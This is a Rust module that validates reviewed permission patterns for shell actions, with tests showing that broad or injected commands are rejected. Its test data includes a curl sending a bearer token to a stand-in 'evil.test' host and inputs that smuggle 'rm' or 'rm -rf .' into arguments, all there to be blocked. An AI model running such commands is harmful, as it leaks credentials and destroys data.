//! Reviewed permission matchers. The stored expression is encrypted with its rule;
//! only the authenticated permission routes may return it to a client.

use regex::{Regex, RegexBuilder};
use serde::{Deserialize, Serialize};
use std::io;

pub const PATTERN_VERSION: u8 = 1;
const MAX_EXPRESSION_BYTES: usize = 1024;
const MAX_ACTION_BYTES: usize = 16 * 1024;
const MIN_LITERAL_BYTES: usize = 8;
const MAX_PLACEHOLDERS: usize = 4;

#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum PatternKind {
    Template,
    Regex,
}

#[derive(Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct PatternSpec {
    pub version: u8,
    pub kind: PatternKind,
    pub expression: String,
}

impl std::fmt::Debug for PatternSpec {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("PatternSpec")
            .field("version", &self.version)
            .field("kind", &self.kind)
            .field("expression", &"[redacted]")
            .finish()
    }
}

impl PatternSpec {
    pub fn identity(&self) -> String {
        let kind = match self.kind {
            PatternKind::Template => "template",
            PatternKind::Regex => "regex",
        };
        format!("pattern:v{}:{kind}:{}", self.version, self.expression)
    }

    pub fn validate(&self, original_action: &str) -> io::Result<()> {
        if self.version != PATTERN_VERSION {
            return Err(invalid("unsupported permission pattern version"));
        }
        if self.expression.is_empty()
            || self.expression.len() > MAX_EXPRESSION_BYTES
            || original_action.len() > MAX_ACTION_BYTES
        {
            return Err(invalid("permission pattern or action exceeds size limit"));
        }
        let matcher = self.compile()?;
        if !matcher.is_match(original_action) {
            return Err(invalid("permission pattern must match the reviewed action"));
        }
        Ok(())
    }

    pub fn matches(&self, action: &str) -> bool {
        self.version == PATTERN_VERSION
            && self.expression.len() <= MAX_EXPRESSION_BYTES
            && action.len() <= MAX_ACTION_BYTES
            && self.compile().is_ok_and(|matcher| matcher.is_match(action))
    }

    fn compile(&self) -> io::Result<Regex> {
        let source = match self.kind {
            PatternKind::Template => self.template_regex()?,
            PatternKind::Regex => self.constrained_regex()?,
        };
        RegexBuilder::new(&source)
            .size_limit(2 * 1024 * 1024)
            .dfa_size_limit(1024 * 1024)
            .build()
            .map_err(|_| invalid("invalid or overly complex permission pattern"))
    }

    fn template_regex(&self) -> io::Result<String> {
        let mut source = String::from(r"\A(?:");
        let mut remaining = self.expression.as_str();
        let mut literal_bytes = 0;
        let mut placeholders = 0;
        let mut quote = None;
        while let Some(open) = remaining.find("{{") {
            let literal = &remaining[..open];
            if literal.contains("}}") {
                return Err(invalid("invalid permission placeholder"));
            }
            literal_bytes += literal.len();
            update_quote_state(literal, &mut quote);
            source.push_str(&regex::escape(literal));
            let tail = &remaining[open + 2..];
            let close = tail
                .find("}}")
                .ok_or_else(|| invalid("unclosed permission placeholder"))?;
            source.push_str(match &tail[..close] {
                "token" => r"[A-Za-z0-9_./:@%+=,-]{1,128}",
                "quoted" if quote.is_some() => r"[A-Za-z0-9_./:@%+=, -]{1,128}",
                "quoted" => {
                    return Err(invalid(
                        "quoted permission placeholder must be inside quotes",
                    ));
                }
                _ => return Err(invalid("unsupported permission placeholder")),
            });
            placeholders += 1;
            remaining = &tail[close + 2..];
        }
        if remaining.contains("}}") {
            return Err(invalid("invalid permission placeholder"));
        }
        literal_bytes += remaining.len();
        update_quote_state(remaining, &mut quote);
        if quote.is_some() {
            return Err(invalid("unclosed quote in permission template"));
        }
        source.push_str(&regex::escape(remaining));
        source.push_str(r")\z");
        if placeholders == 0 || placeholders > MAX_PLACEHOLDERS || literal_bytes < MIN_LITERAL_BYTES
        {
            return Err(invalid("permission placeholder is too broad"));
        }
        Ok(source)
    }

    fn constrained_regex(&self) -> io::Result<String> {
        let expression = self.expression.as_str();
        if !expression.starts_with('^') || !expression.ends_with('$') || expression.len() < 10 {
            return Err(invalid("permission regex must anchor the whole action"));
        }
        let body = &expression[1..expression.len() - 1];
        // Restrict regex rules to literal text plus positive, bounded character classes.
        // This excludes wildcards, branches, optional segments, escapes such as \s, and
        // groups whose meaning is difficult to review in a permission prompt.
        let mut chars = body.chars().peekable();
        let mut prefix_bytes = 0;
        let mut has_class = false;
        while let Some(ch) = chars.next() {
            if ch == '[' {
                has_class = true;
                let mut class = String::new();
                for member in chars.by_ref() {
                    if member == ']' {
                        break;
                    }
                    class.push(member);
                }
                let range_remainder = class
                    .replace("A-Z", "")
                    .replace("a-z", "")
                    .replace("0-9", "");
                if class.is_empty()
                    || class.starts_with('^')
                    || class.len() > 80
                    || !class
                        .chars()
                        .all(|member| member.is_ascii_alphanumeric() || "_./:-".contains(member))
                    || (range_remainder.contains('-') && !range_remainder.ends_with('-'))
                    || chars.next() != Some('{')
                {
                    return Err(invalid("permission regex needs a bounded character class"));
                }
                let mut bounds = String::new();
                for bound in chars.by_ref() {
                    if bound == '}' {
                        break;
                    }
                    bounds.push(bound);
                }
                let (min, max) = bounds
                    .split_once(',')
                    .ok_or_else(|| invalid("permission regex needs a bounded range"))?;
                let min = min
                    .parse::<usize>()
                    .map_err(|_| invalid("invalid permission regex range"))?;
                let max = max
                    .parse::<usize>()
                    .map_err(|_| invalid("invalid permission regex range"))?;
                if min == 0 || min > max || max > 128 {
                    return Err(invalid("permission regex range is too broad"));
                }
                continue;
            }
            if ch == '\\' {
                let escaped = chars
                    .next()
                    .ok_or_else(|| invalid("invalid permission regex escape"))?;
                if !".[]{}()^$?+*|\\".contains(escaped) {
                    return Err(invalid("unsupported permission regex escape"));
                }
                if !has_class {
                    prefix_bytes += escaped.len_utf8();
                }
                continue;
            }
            if ".?*+|(){}^$]".contains(ch) {
                return Err(invalid("permission regex is too broad"));
            }
            if !has_class {
                prefix_bytes += ch.len_utf8();
            }
        }
        if !has_class || prefix_bytes < MIN_LITERAL_BYTES {
            return Err(invalid("permission regex needs a literal prefix"));
        }
        Ok(format!(r"\A(?:{body})\z"))
    }
}

fn update_quote_state(literal: &str, quote: &mut Option<char>) {
    for ch in literal.chars() {
        if ch == '\'' || ch == '"' {
            match quote {
                Some(open) if *open == ch => *quote = None,
                None => *quote = Some(ch),
                _ => (),
            }
        }
    }
}

fn invalid(message: &'static str) -> io::Error {
    io::Error::new(io::ErrorKind::InvalidInput, message)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn spec(kind: PatternKind, expression: &str) -> PatternSpec {
        PatternSpec {
            version: 1,
            kind,
            expression: expression.into(),
        }
    }

    #[test]
    fn placeholders_match_only_complete_actions_and_preserve_quotes() {
        let pattern = spec(
            PatternKind::Template,
            "curl -H 'Authorization: Bearer {{token}}' https://example.test",
        );
        pattern
            .validate("curl -H 'Authorization: Bearer abc123' https://example.test")
            .unwrap();
        assert!(pattern.matches("curl -H 'Authorization: Bearer other' https://example.test"));
        assert!(!pattern.matches("curl -H 'Authorization: Bearer other' https://evil.test"));
        assert!(!pattern.matches("curl -H 'Authorization: Bearer x y' https://example.test"));
        assert!(!pattern.matches("curl -H 'Authorization: Bearer x;rm' https://example.test"));
        assert!(!pattern.matches("prefix curl -H 'Authorization: Bearer x' https://example.test"));
        assert!(
            !pattern.matches("curl -H 'Authorization: Bearer x' https://example.test\nrm -rf .")
        );
    }

    #[test]
    fn constrained_regex_rejects_broad_or_unanchored_patterns() {
        let original = "npm test --token=abc";
        for expression in [
            ".*",
            "^.*$",
            "^npm.*$",
            "^npm test --token=.+$",
            "^npm test --token=[A-Z]*$",
            "^.{1,128}$",
            "^npm|cargo$",
        ] {
            assert!(
                spec(PatternKind::Regex, expression)
                    .validate(original)
                    .is_err(),
                "{expression}"
            );
        }
        let pattern = spec(
            PatternKind::Regex,
            r"^npm test --token=[A-Za-z0-9_-]{1,64}$",
        );
        pattern.validate(original).unwrap();
        assert!(pattern.matches("npm test --token=other"));
        assert!(!pattern.matches("npm lint --token=other"));
        for expression in [
            "^npm test --token=[^x]{1,64}$",
            "^npm test --token=[A-Za-z]{0,64}$",
            "^npm test --token=[A-Za-z]{1,999}$",
            "^npm test --token=[A-Za-z]{1,64}?$",
            "^npm test --token=\\s{1,64}$",
            "^npm test --token=[0-z]{1,64}$",
        ] {
            assert!(
                spec(PatternKind::Regex, expression)
                    .validate(original)
                    .is_err(),
                "{expression}"
            );
        }
    }

    #[test]
    fn placeholders_cover_paths_urls_and_environment_without_crossing_quotes() {
        assert!(
            spec(PatternKind::Template, "npm run {{quoted}} --check")
                .validate("npm run build --check")
                .is_err()
        );
        let cases = [
            (
                "API_KEY={{token}} npm test",
                "API_KEY=new npm test",
                "API_KEY=x y npm test",
            ),
            (
                "cat '/private/{{quoted}}/config'",
                "cat '/private/user/config'",
                "cat '/private/user/other'",
            ),
            (
                "curl https://host.test/token={{token}}",
                "curl https://host.test/token=new",
                "curl https://else.test/token=new",
            ),
        ];
        for (expression, good, bad) in cases {
            let pattern = spec(PatternKind::Template, expression);
            pattern.validate(good).unwrap();
            assert!(pattern.matches(good));
            assert!(!pattern.matches(bad));
        }
    }
}
